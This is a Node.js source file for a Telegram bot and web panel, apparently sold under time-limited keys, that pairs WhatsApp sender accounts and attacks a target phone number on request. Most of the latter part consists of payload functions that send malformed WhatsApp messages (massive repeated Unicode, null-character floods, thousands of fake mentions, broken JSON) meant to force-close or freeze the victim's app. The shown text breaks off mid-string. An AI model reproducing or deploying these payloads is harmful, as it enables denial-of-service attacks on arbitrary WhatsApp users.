const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  proto,
  prepareWAMessageMedia,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const app = express();

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

/*function saveAkses(data) {
  const normalized = {
    owners: data.owners.map(id => id.toString()),
    akses: data.akses.map(id => id.toString())
  };
  fs.writeFileSync(file, JSON.stringify(normalized, null, 2));
}*/

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function makeBox(title, lines) {
  const contentLengths = [
    title.length,
    ...lines.map(l => l.length)
  ];
  const maxLen = Math.max(...contentLengths);

  const top    = "╔" + "═".repeat(maxLen + 2) + "╗";
  const middle = "╠" + "═".repeat(maxLen + 2) + "╣";
  const bottom = "╚" + "═".repeat(maxLen + 2) + "╝";

  const padCenter = (text, width) => {
    const totalPad = width - text.length;
    const left = Math.floor(totalPad / 2);
    const right = totalPad - left;
    return " ".repeat(left) + text + " ".repeat(right);
  };

  const padRight = (text, width) => {
    return text + " ".repeat(width - text.length);
  };

  const titleLine = "║ " + padCenter(title, maxLen) + " ║";
  const contentLines = lines.map(l => "║ " + padRight(l, maxLen) + " ║");

  return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const makeStatus = (number, status) => makeBox("ＳＴＡＴＵＳ", [
  `Ｎｕｍｅｒｏ : ${number}`,
  `Ｅｓｔａｄｏ : ${status.toUpperCase()}`
]);

const makeCode = (number, code) => ({
  text: makeBox("ＳＴＡＴＵＳ ＰＡＩＲ", [
    `Ｎｕｍｅｒｏ : ${number}`,
    `Ｃｏ́ｄｉｇｏ : ${code}`
  ]),
  parse_mode: "HTML"
});

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
╔════════════════════════════╗
║      ACTIVE WA SESSIONS
╠════════════════════════════╣
║  AMOUNT: ${activeNumbers.length}
╚════════════════════════════╝`));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pareando com o número ${BotNumber}...`, { parse_mode: "HTML" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
    } catch (e) {
      console.error("Failed to edit message:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Reconnecting..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "✗ Connection failed."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✓ Connected successfully."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "XATHENAA");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "HTML",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Erro ao solicitar código:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";

  const teks = `
<b>𝑯𝒆𝒍𝒍𝒐, ${username}</b>

<i>( 🕊️ ) ─ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍𝐒 ─</i>
<i>𝐅𝐚𝐬𝐭, 𝐟𝐥𝐞𝐱𝐢𝐛𝐥𝐞, 𝐚𝐧𝐝 𝐚𝐛𝐬𝐨𝐥𝐮𝐭𝐞𝐥𝐲 𝐬𝐚𝐟𝐞,</i>
<i>𝐭𝐡𝐞 𝐧𝐞𝐱𝐭-𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 𝐛𝐨𝐭 𝐧𝐨𝐰 𝐚𝐰𝐚𝐤𝐞𝐧𝐬.</i>

<b>〢「 𝑽𝒆𝒊𝒍𝒈𝒂𝒕𝒆 𝑺𝒚𝒏𝒕𝒉𝒊𝒙 」</b>
│「々」ᴀᴜᴛʜᴏʀ : @nazarickspy
│「々」ᴛʏᴘᴇ  : Case ✗ Plugins
│「々」ʟᴇᴀɢᴜᴇ  : Asia/Indonesia

╭─⦏ 𝑺𝒆𝒏𝒅𝒆𝒓 𝑴𝒆𝒏𝒖 ⦐
│「々」/connect
│「々」/listsender
│「々」/delsender
╰────────────

╭─⦏ 𝑲𝒆𝒚 𝑴𝒂𝒏𝒂𝒈𝒆𝒓 ⦐
│「々」/ckey
│「々」/listkey
│「々」/delkey
╰───────────

╭─⦏ 𝑨𝒄𝒄𝒆𝒔𝒔 𝑴𝒆𝒏𝒖 ⦐
│「々」/addacces
│「々」/delacces
│「々」/addowner
│「々」/delowner
╰────────────
`;

  const keyboard = new InlineKeyboard().url(
    "DEVELOPER",
    "https://t.me/nazarickspy"
  );

  await ctx.replyWithPhoto(
    { url: "https://res.cloudinary.com/shaa/image/upload/v1757383070/shaastore/voggpcuxcmgdcfyso7dw.jpg" },
    {
      caption: teks,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }
  );
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - USER ONLY ACCESS\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply("╭─⦏ 𝐂𝐨𝐧𝐧𝐞𝐜𝐭 ⦐\n│「々」Example: /connect 628xxxx", { parse_mode: "HTML" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - OWNER ACCESS ONLY\n—Please register first to access this resource.");
  }

  if (sessions.size === 0) return ctx.reply("No active sender.");

  const daftarSender = [...sessions.keys()]
    .map(n => `• ${n}`)
    .join("\n");

  ctx.reply(`Daftar Sender Aktif:\n${daftarSender}`);
});

bot.command("delsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - USER ONLY ACCESS\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("╭─⦏ 𝐝𝐞𝐥𝐬𝐞𝐧𝐝𝐞𝐫 ⦐\n│「々」Example: /delsender 628xxxx", { parse_mode: "HTML" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender not found.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✓ Session for bot ${number} successfully deleted.`);
  } catch (err) {
    console.error(err);
    ctx.reply("An error occurred while deleting the sender..");
  }
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - USER ONLY ACCESS\n—Please register first to access this feature.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("╭─⦏ 𝐜𝐤𝐞𝐲 ⦐\n│「々」Example :\n│「々」/ckey synthix,30d\n│「々」/ckey synthix,30d,veil", { parse_mode: "HTML" });
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Incorrect duration format! Use example: 7d / 1d / 12h");

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `<b>╭─⦏ 𝑲𝒆𝒚 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒄𝒓𝒆𝒂𝒕𝒆𝒅 ⦐</b>\n\n` +
    `<b>│「々」𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆:</b> <code>${username}</code>\n` +
    `<b>│「々」𝑲𝒆𝒚:</b> <code>${key}</code>\n` +
    `<b>│「々」𝑬𝒙𝒑𝒊𝒓𝒆𝒅:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - OWNER ONLY ACCESS\n—Please register first to access this resource.");
  }

  if (users.length === 0) return ctx.reply("│「々」𝑵𝒐 𝒌𝒆𝒚𝒔 𝒉𝒂𝒗𝒆 𝒃𝒆𝒆𝒏 𝒄𝒓𝒆𝒂𝒕𝒆𝒅 𝒚𝒆𝒕.");

  let teks = `╭─⦏ 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 ⦐\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `│「々」${i + 1}. ${u.username}\n│「々」𝑲𝒆𝒚: ${u.key}\n│「々」𝑬𝒙𝒑𝒊𝒓𝒆𝒅: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - USER ONLY ACCESS\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("╭─⦏ 𝐝𝐞𝐥𝐤𝐞𝐲 ⦐\n│「々」Example: /delkey synthix");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`│「々」 Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - OWNER ONLY ACCESS\n—Please register first to access this resource.");
  }
  
  if (!id) return ctx.reply("╭─⦏ 𝐚𝐝𝐝𝐚𝐜𝐜𝐞𝐬 ⦐\n│「々」Example: /addacces 123×××", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("│「々」𝑼𝒔𝒆𝒓 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒉𝒂𝒔 𝒂𝒄𝒄𝒆𝒔𝒔");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(` Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - OWNER ONLY ACCESS\n—Please register first to access this resource.");
  }
  
  if (!id) return ctx.reply("╭─⦏ 𝐝𝐞𝐥𝐚𝐜𝐜𝐞𝐬 ⦐\n│「々」Example: /delacces 123×××", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - OWNER ONLY ACCESS\n—Please register first to access this resource.");
  }
  
  if (!id) return ctx.reply("╭─⦏ 𝐚𝐝𝐝𝐨𝐰𝐧𝐞𝐫 ⦐\n│「々」Example: /addowner 123×××", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - OWNER ONLY ACCESS\n—Please register first to access this resource.");
  }
  if (!id) return ctx.reply("╭─⦏ 𝐝𝐞𝐥𝐨𝐰𝐧𝐞𝐫 ⦐\n│「々」Example: /delowner 123×××", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
SCRIPT MADE BY SYNTHIX
`));

bot.launch();
console.log(chalk.red(`
╭─⦏ 𝑽𝒆𝒊𝒍𝒈𝒂𝒕𝒆 𝑺𝒚𝒏𝒕𝒉𝒊𝒙 ⦐
│「々」ɪᴅ ᴏᴡɴ : ${OwnerId}
│「々」ᴅᴇᴠᴇʟᴏᴘᴇʀ : @nazarickspy
│「々」ʙᴏᴛ : ᴄᴏɴɴᴇᴄᴛᴇᴅ ✓
╰───────────────────`));

initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "X-SILENT", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Failed to read Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "X-SILENT", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Failed to read Login file.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./X-SILENT/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✓ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios"].includes(mode)) {
        return res.send(executionPage("✓ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("✗ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("✗ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        GetSuZoXAndros(24, target);
      } else if (mode === "ios") {
        iosflood(24, target);
      } else if (mode === "andros-delay") {
        GetSuZoXAndros(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("✗ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`│「々」𝑺𝒆𝒓𝒗𝒆𝒓 𝒂𝒄𝒕𝒊𝒗𝒆 𝒐𝒏 𝒑𝒐𝒓𝒕: ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== XSILENTS FUNCTIONS ==================== //
async function VtxForceDelMsg2(X) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "😈" + "ꦾ".repeat(100000),
            },
            footer: {
              text: "ꦾ".repeat(100000),
            },
            contextInfo: {
              mentionedJid: ["13135550002@s.whatsapp.net"],
              isForwarded: true,
              forwardingScore: 999,
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
            },
          },
        },
      },
    };
const pertama = await sock.relayMessage(X, message, {
      messageId: "",
      participant: { jid: X },
      userJid: X,
    });

    const kedua = await sock.relayMessage(X, message, {
      messageId: "",
      participant: { jid: X },
      userJid: X,
    });

    await sock.sendMessage(X, { 
      delete: {
        fromMe: true,
        remoteJid: X,
        id: pertama,
      }
    });

    await sock.sendMessage(X, { 
      delete: {
        fromMe: true,
        remoteJid: X,
        id: kedua,
      }
    });

  } catch (err) {
    console.error("Send Forclose Erorr!", err);
  }
 console.log(chalk.red.bold("─────「 ⏤!New FCDelMsg!⏤ 」─────"))
}
async function NewProtocolbug6(X) {
  try {
    let msg = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32)
          },
          interactiveResponseMessage: {
            body: {
              text: "ោ៝".repeat(10000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: "\u0000".repeat(999999),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
              "6289501955295@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
              ],
              isForwarded: true,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "sexy.com",
                newsletterJid: "333333333333333333@newsletter",
                serverMessageId: 1
              }
            }
          }
        }
      }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: X }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
    console.log(chalk.red.bold("─────「 ⏤!Delay StuckFreze!⏤ 」─────"))
  } catch (err) {
    console.error("[bug error]", err);
  }
}

async function iosinVisFC(X) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `https://kominfo.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            matchedText: ".welcomel...",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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